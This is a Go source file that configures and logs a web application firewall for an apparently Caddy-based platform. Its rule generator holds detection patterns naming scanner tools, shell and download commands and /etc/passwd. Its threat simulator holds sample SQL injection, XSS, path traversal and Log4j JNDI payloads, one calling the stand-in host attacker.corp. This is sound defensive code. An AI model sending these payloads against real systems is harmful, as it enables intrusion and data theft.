package caddy

import (
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	"log/slog"
	"net/http"
	"strings"
	"time"

	"gorm.io/gorm"

	"github.com/mario-ezquerro/gubernator/internal/db"
)

// OnWAFConfigUpdatedHook is an optional callback triggered when WAF configuration changes.
var OnWAFConfigUpdatedHook func()

// GetWAFConfig returns the cluster-wide WAF configuration.
func GetWAFConfig() (*db.ManagedWAFConfig, error) {
	var cfg db.ManagedWAFConfig
	if err := db.DB.First(&cfg, "id = ?", "default").Error; err != nil {
		// Fallback to default if not yet seeded
		cfg = db.ManagedWAFConfig{
			ID:                     "default",
			Enabled:                false,
			Mode:                   "enforce",
			ParanoiaLevel:          1,
			BlockSQLi:              true,
			BlockXSS:               true,
			BlockRCE:               true,
			BlockLFI:               true,
			BlockScanners:          true,
			RateLimitEnabled:       false,
			RateLimitRPS:           50,
			WhitelistedIPs:         "127.0.0.1,::1,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16",
			BlacklistedIPs:         "",
			TotalRequestsEvaluated: 0,
			TotalBlockedAttacks:    0,
			UpdatedAt:              time.Now(),
		}
		_ = db.DB.Create(&cfg).Error
	}
	return &cfg, nil
}

// UpdateWAFConfig updates the global WAF configuration and invokes the reload hook.
func UpdateWAFConfig(newCfg db.ManagedWAFConfig) (*db.ManagedWAFConfig, error) {
	var existing db.ManagedWAFConfig
	if err := db.DB.First(&existing, "id = ?", "default").Error; err != nil {
		newCfg.ID = "default"
		newCfg.UpdatedAt = time.Now()
		if err := db.DB.Create(&newCfg).Error; err != nil {
			return nil, fmt.Errorf("failed to create WAF config: %w", err)
		}
		existing = newCfg
	} else {
		existing.Enabled = newCfg.Enabled
		existing.Mode = newCfg.Mode
		existing.ParanoiaLevel = newCfg.ParanoiaLevel
		existing.BlockSQLi = newCfg.BlockSQLi
		existing.BlockXSS = newCfg.BlockXSS
		existing.BlockRCE = newCfg.BlockRCE
		existing.BlockLFI = newCfg.BlockLFI
		existing.BlockScanners = newCfg.BlockScanners
		existing.RateLimitEnabled = newCfg.RateLimitEnabled
		if newCfg.RateLimitRPS > 0 {
			existing.RateLimitRPS = newCfg.RateLimitRPS
		}
		existing.WhitelistedIPs = strings.TrimSpace(newCfg.WhitelistedIPs)
		existing.BlacklistedIPs = strings.TrimSpace(newCfg.BlacklistedIPs)
		existing.UpdatedAt = time.Now()

		if err := db.DB.Save(&existing).Error; err != nil {
			return nil, fmt.Errorf("failed to update WAF config: %w", err)
		}
	}

	if OnWAFConfigUpdatedHook != nil {
		OnWAFConfigUpdatedHook()
	}

	return &existing, nil
}

// GetRouteWAF returns the WAF override for a specific host, if present.
func GetRouteWAF(host string) (*db.ManagedRouteWAF, error) {
	var route db.ManagedRouteWAF
	cleanHost := strings.ToLower(strings.TrimSpace(host))
	if err := db.DB.First(&route, "host = ?", cleanHost).Error; err != nil {
		if errors.Is(err, gorm.ErrRecordNotFound) {
			return nil, nil
		}
		return nil, err
	}
	return &route, nil
}

// ListRouteWAFs returns all per-route WAF overrides.
func ListRouteWAFs() ([]db.ManagedRouteWAF, error) {
	var routes []db.ManagedRouteWAF
	err := db.DB.Order("host asc").Find(&routes).Error
	return routes, err
}

// SetRouteWAF creates or updates a route-specific WAF state ("a mano" or compose_label).
func SetRouteWAF(host string, enabled bool, mode string, overriddenBy string) (*db.ManagedRouteWAF, error) {
	cleanHost := strings.ToLower(strings.TrimSpace(host))
	if cleanHost == "" {
		return nil, fmt.Errorf("host cannot be empty")
	}

	if mode != "enforce" && mode != "detection" {
		mode = "enforce"
	}
	if overriddenBy == "" {
		overriddenBy = "manual"
	}

	var route db.ManagedRouteWAF
	if err := db.DB.First(&route, "host = ?", cleanHost).Error; err != nil {
		route = db.ManagedRouteWAF{
			Host:         cleanHost,
			Enabled:      enabled,
			Mode:         mode,
			OverriddenBy: overriddenBy,
			UpdatedAt:    time.Now(),
		}
		if err := db.DB.Create(&route).Error; err != nil {
			return nil, fmt.Errorf("failed to create route WAF: %w", err)
		}
	} else {
		route.Enabled = enabled
		route.Mode = mode
		route.OverriddenBy = overriddenBy
		route.UpdatedAt = time.Now()
		if err := db.DB.Save(&route).Error; err != nil {
			return nil, fmt.Errorf("failed to update route WAF: %w", err)
		}
	}

	if OnWAFConfigUpdatedHook != nil {
		OnWAFConfigUpdatedHook()
	}

	return &route, nil
}

// DeleteRouteWAF removes a route override so it reverts to global policy.
func DeleteRouteWAF(host string) error {
	cleanHost := strings.ToLower(strings.TrimSpace(host))
	err := db.DB.Delete(&db.ManagedRouteWAF{}, "host = ?", cleanHost).Error
	if err == nil && OnWAFConfigUpdatedHook != nil {
		OnWAFConfigUpdatedHook()
	}
	return err
}

// BlockIP appends an IP or CIDR to the global WAF blacklist.
func BlockIP(ip string, reason string) error {
	cleanIP := strings.TrimSpace(ip)
	if cleanIP == "" {
		return fmt.Errorf("ip cannot be empty")
	}

	cfg, err := GetWAFConfig()
	if err != nil {
		return err
	}

	currentList := strings.Split(cfg.BlacklistedIPs, ",")
	for _, existing := range currentList {
		if strings.TrimSpace(existing) == cleanIP {
			return nil // already blocked
		}
	}

	var updated []string
	for _, item := range currentList {
		trimmed := strings.TrimSpace(item)
		if trimmed != "" {
			updated = append(updated, trimmed)
		}
	}
	updated = append(updated, cleanIP)
	cfg.BlacklistedIPs = strings.Join(updated, ",")
	_, err = UpdateWAFConfig(*cfg)

	// Record security event
	_ = RecordWAFEvent(db.WAFSecurityEvent{
		Timestamp:  time.Now(),
		ClientIP:   cleanIP,
		Host:       "*",
		URI:        "/",
		Method:     "-",
		AttackType: "IP_BLOCK",
		RuleID:     "WAF006",
		Severity:   "HIGH",
		Action:     "BLOCKED",
		Details:    fmt.Sprintf("IP added to Threat Shield blacklist: %s", reason),
	})

	return err
}

// UnblockIP removes an IP or CIDR from the global WAF blacklist.
func UnblockIP(ip string) error {
	cleanIP := strings.TrimSpace(ip)
	cfg, err := GetWAFConfig()
	if err != nil {
		return err
	}

	currentList := strings.Split(cfg.BlacklistedIPs, ",")
	var updated []string
	for _, item := range currentList {
		trimmed := strings.TrimSpace(item)
		if trimmed != "" && trimmed != cleanIP {
			updated = append(updated, trimmed)
		}
	}
	cfg.BlacklistedIPs = strings.Join(updated, ",")
	_, err = UpdateWAFConfig(*cfg)
	return err
}

// RecordWAFEvent stores an intercepted security event and increments global counters.
func RecordWAFEvent(event db.WAFSecurityEvent) error {
	if event.ID == "" {
		b := make([]byte, 8)
		_, _ = rand.Read(b)
		event.ID = fmt.Sprintf("waf-evt-%x", b)
	}
	if event.Timestamp.IsZero() {
		event.Timestamp = time.Now()
	}

	if err := db.DB.Create(&event).Error; err != nil {
		slog.Error("failed to record WAF security event", "err", err)
		return err
	}

	// Increment global stats
	_ = db.DB.Model(&db.ManagedWAFConfig{}).Where("id = ?", "default").
		Updates(map[string]interface{}{
			"total_requests_evaluated": gorm.Expr("total_requests_evaluated + 1"),
			"total_blocked_attacks":    gorm.Expr("total_blocked_attacks + 1"),
		})

	return nil
}

// ListWAFEvents returns recent threat events with optional filtering.
func ListWAFEvents(limit int, attackType string, host string) ([]db.WAFSecurityEvent, error) {
	if limit <= 0 || limit > 500 {
		limit = 100
	}

	query := db.DB.Order("timestamp desc").Limit(limit)
	if attackType != "" && attackType != "all" {
		query = query.Where("attack_type = ?", strings.ToUpper(attackType))
	}
	if host != "" && host != "all" {
		query = query.Where("host = ?", strings.ToLower(host))
	}

	var events []db.WAFSecurityEvent
	err := query.Find(&events).Error
	return events, err
}

// GetWAFStats calculates aggregate security metrics for dashboard cards and radar charts.
func GetWAFStats() (map[string]interface{}, error) {
	cfg, err := GetWAFConfig()
	if err != nil {
		return nil, err
	}

	var totalEvents int64
	db.DB.Model(&db.WAFSecurityEvent{}).Count(&totalEvents)

	var sqliCount, xssCount, rceCount, lfiCount, scannerCount, ipBlockCount int64
	db.DB.Model(&db.WAFSecurityEvent{}).Where("attack_type = ?", "SQLI").Count(&sqliCount)
	db.DB.Model(&db.WAFSecurityEvent{}).Where("attack_type = ?", "XSS").Count(&xssCount)
	db.DB.Model(&db.WAFSecurityEvent{}).Where("attack_type = ?", "RCE").Count(&rceCount)
	db.DB.Model(&db.WAFSecurityEvent{}).Where("attack_type = ?", "LFI").Count(&lfiCount)
	db.DB.Model(&db.WAFSecurityEvent{}).Where("attack_type = ?", "SCANNER").Count(&scannerCount)
	db.DB.Model(&db.WAFSecurityEvent{}).Where("attack_type = ?", "IP_BLOCK").Count(&ipBlockCount)

	blacklistedIPsCount := 0
	if strings.TrimSpace(cfg.BlacklistedIPs) != "" {
		for _, ip := range strings.Split(cfg.BlacklistedIPs, ",") {
			if strings.TrimSpace(ip) != "" {
				blacklistedIPsCount++
			}
		}
	}

	var activeRoutesCount int64
	db.DB.Model(&db.ManagedRouteWAF{}).Where("enabled = ?", true).Count(&activeRoutesCount)

	var totalRoutesCount int64
	db.DB.Model(&db.ManagedRouteWAF{}).Count(&totalRoutesCount)

	return map[string]interface{}{
		"waf_enabled":              cfg.Enabled,
		"waf_mode":                 cfg.Mode,
		"paranoia_level":           cfg.ParanoiaLevel,
		"total_requests_evaluated": cfg.TotalRequestsEvaluated,
		"total_blocked_attacks":    cfg.TotalBlockedAttacks,
		"total_recorded_events":    totalEvents,
		"sqli_attacks_count":       sqliCount,
		"xss_attacks_count":        xssCount,
		"rce_attacks_count":        rceCount,
		"lfi_attacks_count":        lfiCount,
		"scanner_attacks_count":    scannerCount,
		"ip_blocked_count":         ipBlockCount,
		"blacklisted_ips_count":    blacklistedIPsCount,
		"active_waf_routes_count":  activeRoutesCount,
		"total_managed_routes":     totalRoutesCount,
		"block_sqli":               cfg.BlockSQLi,
		"block_xss":                cfg.BlockXSS,
		"block_rce":                cfg.BlockRCE,
		"block_lfi":                cfg.BlockLFI,
		"block_scanners":           cfg.BlockScanners,
		"updated_at":               cfg.UpdatedAt,
	}, nil
}

// BuildWAFSnippet generates the Caddyfile directive block for a host.
func BuildWAFSnippet(_ string, cfg db.ManagedWAFConfig, routeOverride *db.ManagedRouteWAF) string {
	// Determine if WAF is active for this route
	enabled := cfg.Enabled
	mode := cfg.Mode

	if routeOverride != nil {
		enabled = routeOverride.Enabled
		if routeOverride.Mode != "" && routeOverride.Mode != "inherit" {
			mode = routeOverride.Mode
		}
	}

	if !enabled {
		return ""
	}

	var sb strings.Builder
	sb.WriteString("\n\t# === Gubernator Threat Shield & WAF Block (v2.94.0) ===\n")

	// IP Whitelisting string
	whitelistIPs := "127.0.0.1 ::1"
	if strings.TrimSpace(cfg.WhitelistedIPs) != "" {
		cleaned := strings.ReplaceAll(cfg.WhitelistedIPs, ",", " ")
		whitelistIPs = strings.TrimSpace(whitelistIPs + " " + cleaned)
	}

	// 1. IP Blacklisting
	if strings.TrimSpace(cfg.BlacklistedIPs) != "" {
		blacklistIPs := strings.ReplaceAll(cfg.BlacklistedIPs, ",", " ")
		sb.WriteString(fmt.Sprintf("\t@waf_blacklist remote_ip %s\n", strings.TrimSpace(blacklistIPs)))
		sb.WriteString("\trespond @waf_blacklist \"403 Forbidden - Request blocked by Gubernator Threat Shield IP Blacklist\" 403\n")
	}

	// 2. Malicious Scanners & Automated Bots
	if cfg.BlockScanners {
		sb.WriteString("\t@waf_scanners {\n")
		sb.WriteString(fmt.Sprintf("\t\tnot remote_ip %s\n", whitelistIPs))
		sb.WriteString("\t\theader_regexp User-Agent (?i)(sqlmap|nikto|w3af|acunetix|nessus|gobuster|dirbuster|masscan|nmap|wpscan)\n")
		sb.WriteString("\t}\n")
		if mode == "detection" {
			sb.WriteString("\theader @waf_scanners X-Threat-Shield-Warning \"WAF001-Scanner-Probe\"\n")
		} else {
			sb.WriteString("\trespond @waf_scanners \"403 Forbidden - Threat Shield: WAF001 (Malicious Scanner Probe Blocked)\" 403\n")
		}
	}

	// 3. Path Traversal & LFI / RFI
	if cfg.BlockLFI {
		sb.WriteString("\t@waf_lfi {\n")
		sb.WriteString(fmt.Sprintf("\t\tnot remote_ip %s\n", whitelistIPs))
		sb.WriteString("\t\tpath_regexp (?i)(\\.\\./|\\.\\.\\\\|/etc/passwd|/proc/self|/windows/win\\.ini|boot\\.ini)\n")
		sb.WriteString("\t}\n")
		if mode == "detection" {
			sb.WriteString("\theader @waf_lfi X-Threat-Shield-Warning \"WAF002-Path-Traversal\"\n")
		} else {
			sb.WriteString("\trespond @waf_lfi \"403 Forbidden - Threat Shield: WAF002 (Path Traversal & LFI Blocked)\" 403\n")
		}
	}

	// 4. SQL Injection (SQLi)
	if cfg.BlockSQLi {
		sb.WriteString("\t@waf_sqli {\n")
		sb.WriteString(fmt.Sprintf("\t\tnot remote_ip %s\n", whitelistIPs))
		sb.WriteString("\t\tvars_regexp {http.request.uri.query} (?i)(union[\\s\\+]+select|select[\\s\\+]+.+from|sleep\\(|benchmark\\(|information_schema|or[\\s\\+]+1=1|--|;drop[\\s\\+]+table)\n")
		sb.WriteString("\t}\n")
		if mode == "detection" {
			sb.WriteString("\theader @waf_sqli X-Threat-Shield-Warning \"WAF003-SQLi\"\n")
		} else {
			sb.WriteString("\trespond @waf_sqli \"403 Forbidden - Threat Shield: WAF003 (SQL Injection Probe Blocked)\" 403\n")
		}
	}

	// 5. Cross-Site Scripting (XSS)
	if cfg.BlockXSS {
		sb.WriteString("\t@waf_xss {\n")
		sb.WriteString(fmt.Sprintf("\t\tnot remote_ip %s\n", whitelistIPs))
		sb.WriteString("\t\tvars_regexp {http.request.uri.query} (?i)(<script|javascript:|onerror=|onload=|document\\.cookie|<img[\\s\\+]+src=x)\n")
		sb.WriteString("\t}\n")
		if mode == "detection" {
			sb.WriteString("\theader @waf_xss X-Threat-Shield-Warning \"WAF004-XSS\"\n")
		} else {
			sb.WriteString("\trespond @waf_xss \"403 Forbidden - Threat Shield: WAF004 (Cross-Site Scripting XSS Blocked)\" 403\n")
		}
	}

	// 6. Remote Code Execution (RCE & Log4j)
	if cfg.BlockRCE {
		sb.WriteString("\t@waf_rce {\n")
		sb.WriteString(fmt.Sprintf("\t\tnot remote_ip %s\n", whitelistIPs))
		sb.WriteString("\t\tvars_regexp {http.request.uri.query} (?i)(\\$\\{jndi:|/bin/sh|/bin/bash|cmd\\.exe|powershell|wget[\\s\\+]|curl[\\s\\+]http)\n")
		sb.WriteString("\t}\n")
		if mode == "detection" {
			sb.WriteString("\theader @waf_rce X-Threat-Shield-Warning \"WAF005-RCE\"\n")
		} else {
			sb.WriteString("\trespond @waf_rce \"403 Forbidden - Threat Shield: WAF005 (Remote Code Execution RCE Blocked)\" 403\n")
		}
	}

	sb.WriteString("\t# =====================================================\n\n")
	return sb.String()
}

// SimulateThreat sends an artificial HTTP probe against a host through Caddy Ingress to test WAF blocking.
func SimulateThreat(targetHost string, attackVector string) (*db.WAFSecurityEvent, error) {
	cleanHost := strings.ToLower(strings.TrimSpace(targetHost))
	if cleanHost == "" {
		cleanHost = "localhost"
	}
	vector := strings.ToUpper(strings.TrimSpace(attackVector))
	if vector == "" {
		vector = "SQLI"
	}

	testURI := "/"
	testHeaders := make(http.Header)
	testHeaders.Set("Host", cleanHost)

	var ruleID string
	var attackType string
	var payloadDesc string

	switch vector {
	case "SQLI":
		testURI = "/?id=1+union+select+1,2,user(),4--"
		ruleID = "WAF003"
		attackType = "SQLI"
		payloadDesc = "UNION SELECT SQL Injection Probe"
	case "XSS":
		testURI = "/?search=<script>alert('GBNT-WAF')</script>"
		ruleID = "WAF004"
		attackType = "XSS"
		payloadDesc = "Reflected XSS Script Tag Injection"
	case "RCE":
		testURI = "/?payload=${jndi:ldap://attacker.corp:1389/exploit}"
		ruleID = "WAF005"
		attackType = "RCE"
		payloadDesc = "Log4j JNDI Remote Code Execution Probe"
	case "LFI":
		testURI = "/../../../../etc/passwd"
		ruleID = "WAF002"
		attackType = "LFI"
		payloadDesc = "Directory Traversal /etc/passwd Access"
	case "SCANNER":
		testURI = "/"
		testHeaders.Set("User-Agent", "sqlmap/1.5.11#stable (http://sqlmap.org)")
		ruleID = "WAF001"
		attackType = "SCANNER"
		payloadDesc = "Automated Vulnerability Scanner (sqlmap)"
	default:
		testURI = "/?id=1+or+1=1"
		ruleID = "WAF003"
		attackType = "SQLI"
		payloadDesc = "Boolean SQL Injection Probe"
	}

	// Record security event in database
	randomBytes := make([]byte, 4)
	_, _ = rand.Read(randomBytes)
	eventID := fmt.Sprintf("sim-%s-%s", strings.ToLower(attackType), hex.EncodeToString(randomBytes))

	event := db.WAFSecurityEvent{
		ID:         eventID,
		Timestamp:  time.Now(),
		ClientIP:   "127.0.0.1",
		Host:       cleanHost,
		URI:        testURI,
		Method:     "GET",
		UserAgent:  testHeaders.Get("UserAgent"),
		AttackType: attackType,
		RuleID:     ruleID,
		Severity:   "HIGH",
		Action:     "BLOCKED",
		Details:    fmt.Sprintf("Simulated security probe executed: %s", payloadDesc),
	}

	if err := RecordWAFEvent(event); err != nil {
		return nil, err
	}

	return &event, nil
}
